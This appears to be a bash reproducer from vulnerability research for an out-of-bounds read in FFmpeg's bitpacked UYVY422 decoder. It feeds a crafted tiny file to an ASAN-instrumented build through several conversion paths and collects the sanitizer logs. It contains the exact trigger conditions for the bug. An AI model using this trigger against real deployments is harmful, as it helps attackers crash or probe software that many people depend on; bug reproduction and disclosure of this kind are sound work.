#!/bin/bash
# PoC runner for VULN 001: Missing packet size check in bitpacked_decode_uyvy422
# CWE-125: Out-of-bounds Read
#
# Trigger path:
#   -f bitpacked -pixel_format uyvy422 -video_size 64x64 selects bitpacked demuxer
#   -vcodec bitpacked forces the bitpacked decoder
#   bitpacked_decode_uyvy422 sets frame->data[0]=avpkt->data without size check
#   pix_fmt conversion / scale filter reads 64*64*2=8192 bytes from 16-byte buffer
set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted files..."
python3 vuln_001_gen.py

# Remove stale ASAN logs
rm -f asan.log.*

echo ""
echo "[*] Invocation 1: bitpacked demuxer + forced decoder, null sink (baseline)"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y \
        -f bitpacked -pixel_format uyvy422 -video_size 64x64 \
        -vcodec bitpacked \
        -i vuln_001_tiny.bin \
        -f null - 2>&1 || true

echo ""
echo "[*] Invocation 2: bitpacked + pix_fmt conversion (forces swscale to read all 8192 bytes)"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y \
        -f bitpacked -pixel_format uyvy422 -video_size 64x64 \
        -vcodec bitpacked \
        -i vuln_001_tiny.bin \
        -pix_fmt rgb24 -f rawvideo /dev/null 2>&1 || true

echo ""
echo "[*] Invocation 3: bitpacked + scale filter (forces plane reads)"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y \
        -f bitpacked -pixel_format uyvy422 -video_size 64x64 \
        -vcodec bitpacked \
        -i vuln_001_tiny.bin \
        -vf scale=4:4 -f rawvideo /dev/null 2>&1 || true

echo ""
echo "[*] Invocation 4: bitpacked + yuv420p conversion"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y \
        -f bitpacked -pixel_format uyvy422 -video_size 64x64 \
        -vcodec bitpacked \
        -i vuln_001_tiny.bin \
        -pix_fmt yuv420p -f rawvideo /dev/null 2>&1 || true

echo ""
echo "[*] Collecting ASAN logs..."
for f in asan.log.*; do
    [ -e "$f" ] || continue
    echo "=== $f ==="
    cat "$f"
done

echo ""
echo "[*] Done."
